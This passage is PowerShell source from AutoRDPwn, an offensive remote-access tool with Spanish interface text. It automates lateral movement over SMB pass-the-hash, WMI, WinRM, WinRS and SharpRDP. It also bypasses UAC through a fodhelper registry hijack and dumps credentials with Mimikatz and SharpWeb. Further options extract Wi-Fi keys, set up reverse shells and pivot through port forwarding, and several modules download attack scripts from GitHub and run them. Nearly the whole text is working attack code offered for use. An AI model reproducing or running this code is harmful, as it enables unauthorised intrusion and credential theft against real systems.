        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SMBExec.ps1 } else {
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SMBExec.ps1')}
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -noprofile -windowstyle hidden $Pwn1" ; Write-Host
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -noprofile -windowstyle hidden $Pwn2" ; Write-Host
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -noprofile -windowstyle hidden $Pwn3" ; Write-Host
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -noprofile -windowstyle hidden $Pwn4" ; Write-Host
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -noprofile -windowstyle hidden $Pwn5" }

        '3' {
        if($option) { $computer='localhost' } else {
        Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $computer = $Host.UI.ReadLine() ; if($computer -in '0','b','back','volver','atras'){ $input = 'volver' ; break }
        if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_computer){ $computer = $mem_computer } else { $computer = 'localhost' }
        & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host $computer } ; $mem_computer = $computer
        Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_user){ $user = $mem_user }
        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; if($user){ Write-Host $user } else { Write-Host $currentuser }} ; $mem_user = $user
        $user = Resolve-TargetUser $user $computer
        Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        do { $PlainTextPassword = Read-PlainText ; if(!$PlainTextPassword -and $mem_pass){ $PlainTextPassword = $mem_pass ; Write-Host "[i] Usando la clave guardada" -ForegroundColor DarkGray }
        $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; if($PlainTextPassword){ $mem_pass = $PlainTextPassword }
        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword )
        if($user){ $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) }
        $Host.UI.RawUI.ForegroundColor = 'Blue' }
        if(!(Test-RemoteTcp -Computer $computer -Port 135 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 135 (DCOM/WMI) esta cerrado en ${computer}.. este ataque no puede funcionar" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
        $CimSes = $null ; if($user -and !$credential){ $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) }
        try { $cimargs = @{ ComputerName = $computer ; SessionOption = (New-CimSessionOption -Protocol Dcom) ; ErrorAction = 'Stop' } ; if($user){ $cimargs['Credential'] = $credential }
        $CimSes = New-CimSession @cimargs } catch { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
        foreach ($pwn in @($Pwn1,$Pwn2,$Pwn3,$Pwn4)) { try { if(!$CimSes){ throw }
        $result = Invoke-CimMethod -CimSession $CimSes -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "powershell.exe -noprofile -windowstyle hidden $pwn" } -ErrorAction Stop
        if($result.ReturnValue -eq 0){ Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red } }
        catch { Write-Host "[!] Command execution failed!" -ForegroundColor Red } ; Write-Host }
        if($CimSes){ Remove-CimSession $CimSes 2>&1> $null }}

        '4' {
        if($option) { $computer='localhost' } else {
        Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $computer = $Host.UI.ReadLine() ; if($computer -in '0','b','back','volver','atras'){ $input = 'volver' ; break }
        if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_computer){ $computer = $mem_computer } else { $computer = 'localhost' }
        & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host $computer } ; $mem_computer = $computer
        Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_user){ $user = $mem_user }
        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; if($user){ Write-Host $user } else { Write-Host $currentuser }} ; $mem_user = $user
        $user = Resolve-TargetUser $user $computer
        Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        do { $PlainTextPassword = Read-PlainText ; if(!$PlainTextPassword -and $mem_pass){ $PlainTextPassword = $mem_pass ; Write-Host "[i] Usando la clave guardada" -ForegroundColor DarkGray }
        $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; if($PlainTextPassword){ $mem_pass = $PlainTextPassword }
        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword )
        if($user){ $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) }
        $Host.UI.RawUI.ForegroundColor = 'Blue' }
        if($user -and !$credential){ $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) }
        if(!(Test-RemoteTcp -Computer $computer -Port 5985 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 5985 (WinRM) esta cerrado en ${computer}.. WinRM no se puede habilitar por si mismo: lanza antes el ataque 3 (WMI) o 1 (SMB)" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
        $sessionoption = New-PSSessionOption -OpenTimeout 8000 -CancelTimeout 3000 -OperationTimeout 30000
        try { if(!$user){ $RDP = New-PSSession -Computer $computer -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop }
        else { $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop } } catch { $RDP = $null }
        if($RDP){ Write-Host "[i] ${computer}: ejecutando payloads por WinRM en una sesion unica.." -ForegroundColor DarkGray }
        foreach ($pwn in @($Pwn1,$Pwn2,$Pwn3,$Pwn4)) { try { if(!$RDP){ throw }
        Invoke-Command -Session $RDP -ScriptBlock { Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile','-Command',$using:pwn -ErrorAction Stop } -ErrorAction Stop ; Write-Host "[+] Command was executed successfully!" }
        catch { Write-Host "[!] Command execution failed!" -ForegroundColor Red } }}

        '5' {
        Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $computer = $Host.UI.ReadLine() ; if($computer -in '0','b','back','volver','atras'){ $input = 'volver' ; break }
        if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_computer){ $computer = $mem_computer } else { $computer = 'localhost' }
        & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host $computer } ; $mem_computer = $computer
        Write-Host "[i] Formato de usuario: DOMINIO\usuario | .\usuario (cuenta local) | usuario@dominio" -ForegroundColor DarkGray
        Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_user){ $user = $mem_user }
        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; if($user){ Write-Host $user } else { $user = $currentuser ; Write-Host $currentuser }} ; $mem_user = $user
        $user = Resolve-TargetUser $user $computer
        do { Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $PlainTextPassword = Read-PlainText ; if(!$PlainTextPassword -and $mem_pass){ $PlainTextPassword = $mem_pass ; Write-Host "[i] Usando la clave guardada" -ForegroundColor DarkGray }
        $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; if($PlainTextPassword){ $mem_pass = $PlainTextPassword }
        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword )
        $Host.UI.RawUI.ForegroundColor = 'Blue'
        if(!(Test-RemoteTcp -Computer $computer -Port 5985 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 5985 (WinRM) esta cerrado en ${computer}.. WinRS necesita WinRM ya activo en el destino: lanza antes el ataque 3 (WMI) o 1 (SMB)" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
        Write-Host "[i] ${computer}: habilitando WinRM/firewall en el destino (1 sola autenticacion WinRS).." -ForegroundColor DarkGray
        $winrsout = & winrs.exe -r:$computer -u:$user -p:$PlainTextPassword -noecho -noprofile -allowdelegate "powershell.exe -noprofile -windowstyle hidden $Pwn1 ; $Pwn2 ; $Pwn3 ; $Pwn4" 2>&1
        if($LASTEXITCODE -eq 0){ Write-Host "[+] Command was executed successfully!" -ForegroundColor Green } else { Write-Host "[!] WinRS fallo en ${computer} (codigo $LASTEXITCODE): $winrsout" -ForegroundColor Red ; Write-Host "[i] Si es error de autenticacion, revisa la clave y el formato de usuario (DOMINIO\usuario o .\usuario para cuentas locales)" -ForegroundColor DarkGray ; Start-Sleep -milliseconds 2000 }}

        '6' {
        Write-Host ; $test = Test-Command tscon ; if($test -in 'True'){ Write-Host "[i] $txt28" -ForegroundColor Green ; Write-Host
        if(!(Get-Module -ListAvailable -Name NtObjectManager -ErrorAction SilentlyContinue)){ Write-Host "[i] Instalando NtObjectManager (solo la primera vez; despues se carga de cache).." -ForegroundColor DarkGray
        Install-PackageProvider -Name NuGet -Force 2>&1> $null ; Install-Module -Name NtObjectManager -SkipPublisherCheck -Force 2>&1> $null }
        Import-Module NtObjectManager -ErrorAction SilentlyContinue 2>&1> $null
        Write-Host "[+] $txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session 
        do { Write-Host ; & $question ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $tscon = $Host.UI.ReadLine() ; 
        if(!$tscon){ Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } elseif($tscon -notmatch '^[0-9]+$'){
        Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; $tscon = $null }} until ($tscon)
        Start-Win32ChildProcess "tscon $tscon" 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
        else { Write-Host "[!] $txt5" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; $input = $null ; Show-Banner ; Show-Menu }}

        '7' {
        if($option) { $computer='localhost' } else {
        Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $computer = $Host.UI.ReadLine() ; if($computer -in '0','b','back','volver','atras'){ $input = 'volver' ; break }
        if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_computer){ $computer = $mem_computer } else { $computer = 'localhost' }
        & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host $computer } ; $mem_computer = $computer
        Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_user){ $user = $mem_user }
        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; if($user){ Write-Host $user } else { Write-Host $currentuser }} ; $mem_user = $user
        $user = Resolve-TargetUser $user $computer
        Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        do { $PlainTextPassword = Read-PlainText ; if(!$PlainTextPassword -and $mem_pass){ $PlainTextPassword = $mem_pass ; Write-Host "[i] Usando la clave guardada" -ForegroundColor DarkGray }
        $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; if($PlainTextPassword){ $mem_pass = $PlainTextPassword }
        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword ) }
        if(!(Test-RemoteTcp -Computer $computer -Port 3389 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 3389 (RDP) esta cerrado en ${computer}.. SharpRDP necesita el escritorio remoto activo" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; $srexepath = Join-Path $env:TEMP 'SharpRDP.exe'
        Get-Process SharpRDP -ErrorAction SilentlyContinue | Stop-Process -Force 2>&1> $null
        if ($local){ $srb64 = [regex]::Match((Get-Content "$localpath\Resources\Scripts\Invoke-SharpRDP.ps1" -Raw), '"([A-Za-z0-9+/=]{100000,})"').Groups[1].Value
        try { [IO.File]::WriteAllBytes($srexepath, [Convert]::FromBase64String($srb64)) } catch { $null } }
        else { try { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpRDP.ps1') ; Move-Item -Path '.\SharpRDP.exe' -Destination $srexepath -Force } catch { $null } }
        if(!(Test-Path $srexepath)){ Write-Host "[!] No se pudo preparar SharpRDP.exe en $env:TEMP (bloqueado por antivirus?).. prueba otro ataque" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } else {
        Write-Host "[i] ${computer}: lanzando payload en 1 sola sesion RDP (SharpRDP + auto-elevacion UAC, limite 45s).." -ForegroundColor DarkGray
        $srcommand = "powershell -nop -w h -c `$e='Get-NetConnectionProfile|Set-NetConnectionProfile -NetworkCategory Private;Enable-PSRemoting -Force -SkipNetworkProfileCheck';whoami /groups >> `$env:TEMP\AutoRDPwn-payload.log;`$k='HKCU\Software\Classes\ms-settings\Shell\Open\command';if((whoami /groups) -match 'S-1-16-12288'){iex `$e}else{reg add `$k /v DelegateExecute /f;reg add `$k /d ('powershell -nop -w h -c '+`$e) /f;fodhelper}"
        $srargs = 'computername=' + $computer + ' command="' + $srcommand + '"'
        if($user){ $srargs = 'computername=' + $computer + ' username="' + $user + '" password="' + $PlainTextPassword + '" command="' + $srcommand + '"' }
        $srpsi = New-Object System.Diagnostics.ProcessStartInfo ; $srpsi.FileName = $srexepath ; $srpsi.Arguments = $srargs ; $srpsi.UseShellExecute = $false ; $srpsi.WorkingDirectory = $env:TEMP
        try { $srproc = [System.Diagnostics.Process]::Start($srpsi)
        if(!$srproc.WaitForExit(45000)){ $srproc.Kill() ; Write-Host "[!] SharpRDP sin respuesta en ${computer} tras 45s.. cancelado. Prueba otra vez o usa otro ataque" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }
        elseif($srproc.ExitCode -eq 0){ Write-Host "[+] Command was executed successfully!" -ForegroundColor Green }
        else { Write-Host "[!] SharpRDP termino con codigo $($srproc.ExitCode)" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } }
        catch { Write-Host "[!] No se pudo lanzar SharpRDP: $($_.Exception.Message)" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }
        Write-Host "[i] Si WinRM sigue apagado: en la maquina destino revisa RunMRU (HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU) y %TEMP%\AutoRDPwn-payload.log -- ahi se ve el texto exacto que llego al dialogo Ejecutar" -ForegroundColor DarkGray
        del $srexepath 2>&1> $null }}
        
        'M' { Show-Banner ; if($mem_computer){ Write-Host "[i] Ultimo objetivo: $mem_computer" -ForegroundColor DarkGray }
        Write-Host ; & $question ; Write-Host "$txt8" -ForegroundColor Gray
        $module = Read-TuiMenu -Keys @('1','2','3','4','5','6','7','M','X') -Labels @("$txt17","$txt50",'Networking / Pivoting','Remote Desktop Forensics',"$txt64","$txt68","$txt69","$txt22","$txt2") ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; if(!$module){ $module = 'X' }

        if($module -like '1') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Named Pipe Remote Shell (SMB)" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt39" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - PowerShell HTTP-RevShell (HTTP/S)" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt51" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt52" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $shell = $Host.UI.ReadLine() ; Write-Host

        if($shell -like '1'){ $smbshell = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }

        if($shell -like '2'){ $console = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }

        if($shell -like '3'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host
        & $question ; Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $webrevip = $Host.UI.ReadLine() ; Write-Host
        & $question ; Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $webrevport = $Host.UI.ReadLine() ; Write-Host
        Write-Host "[i] $txt46" -ForegroundColor Green ; $netcat = 'local' ; Start-Sleep -milliseconds 2000 ; $revshell = "true" }
        
        if($shell -like '4'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host
        & $question ; Write-Host "$txt53" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
        Write-Host "[i] $txt46" -ForegroundColor Green ; $netcat = 'local' ; Start-Sleep -milliseconds 2000 }

        if($shell -like '5'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host
        & $question ; Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
        & $question ; Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $ipadress = $Host.UI.ReadLine() ; Write-Host
        Write-Host "[i] $txt46" -ForegroundColor Green ; $netcat = 'remote' ; Start-Sleep -milliseconds 2000 }

        if($shell -like 'X'){ $input = 'x' ; continue }
        if($shell -in '1','2','3','4','5','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}

        if($module -like '2') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt9" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt10" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt49" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt59" -ForegroundColor Gray    
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine 
        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $passandhash = $Host.UI.ReadLine() ; Write-Host

        if($passandhash -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
        Write-Host ; Write-Host "[+] $txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if ($local){ Import-Module .\Resources\Scripts\Invoke-Mimikatz.ps1 } else {
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Mimikatz.ps1')}
        Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit" | Set-Clipboard ; Get-Clipboard
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }

        if($passandhash -like '2') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
        Write-Host ; Write-Host "[+] $txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if ($local){ Import-Module .\Resources\Scripts\Invoke-Mimikatz.ps1 } else {
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Mimikatz.ps1')}
        Invoke-Mimikatz -Command "privilege::debug token::elevate sekurlsa::logonPasswords exit" | Set-Clipboard ; Get-Clipboard
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }

        if($passandhash -like '3') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if ($local){ Import-Module .\Resources\Scripts\Invoke-SharpWeb.ps1 } else {
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpWeb.ps1')}
        .\SharpWeb.exe all | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; del .\SharpWeb.exe ; Start-Sleep -milliseconds 2000 }

        if($passandhash -like '4') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        function Get-Wlan-Keys {[CmdletBinding()]Param ()
        $wlans = netsh wlan show profiles | Select-String -Pattern "$txt58" | Foreach-Object {$_.ToString()}
        $exportdata = $wlans | Foreach-Object {$_.Replace("    $txt58     : ",$null)}
        $exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}}
        $wifikey = Get-Wlan-Keys ; if (!($wifikey -like "*Wi-Fi*")){ Write-Host ; Write-Host "[!] $txt60" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } 
        else { Write-Host ; $wifikey | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "[i] " -nonewline ; pause }}
        
        if($passandhash -like 'X'){ $input = 'x' ; continue }
        if($passandhash -in '1','2','3','4','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}

        if($module -like '3') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - TCP Port Scan" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Native Port Forwarding" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Powershell Web Server" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Network Creds Scanner" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}

        $Host.UI.RawUI.ForegroundColor = 'Green' ; $networking = $Host.UI.ReadLine() ; Write-Host
        if($networking -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $ProgressPreference = "Continue" ; if ($local){ Import-Module .\Resources\Scripts\Invoke-Portscan.ps1 } else {
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Portscan.ps1')}
        & $question ; Write-Host "$txt55" -NoNewLine -ForegroundColor Gray ; $porthost = $Host.UI.ReadLine() ; Write-Host ;  & $question ; Write-Host "$txt56" -NoNewLine -ForegroundColor Gray ; $threads = $Host.UI.ReadLine() ; Write-Host
        & $question ; Write-Host "$txt57" -NoNewLine -ForegroundColor Gray ; $topports = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Invoke-Portscan -Hosts $porthost -T $threads -TopPorts $topports 
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; $ProgressPreference = "SilentlyContinue" ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }

        if($networking -like '2') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt14" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt15" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt16" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt20" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}

        $Host.UI.RawUI.ForegroundColor = 'Green' ; $forwarding = $Host.UI.ReadLine() ; Write-Host
        if($forwarding -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; & $question ; Write-Host "$txt41" -NoNewLine -ForegroundColor Gray
        $lport = $Host.UI.ReadLine() ; Write-Host ; & $question ; Write-Host "$txt42" -NoNewLine -ForegroundColor Gray ; $lhost = $Host.UI.ReadLine() ; Write-Host
        & $question ; Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $rport = $Host.UI.ReadLine() ; Write-Host ; & $question ; Write-Host "$txt44" -NoNewLine -ForegroundColor Gray ; $rhost = $Host.UI.ReadLine()
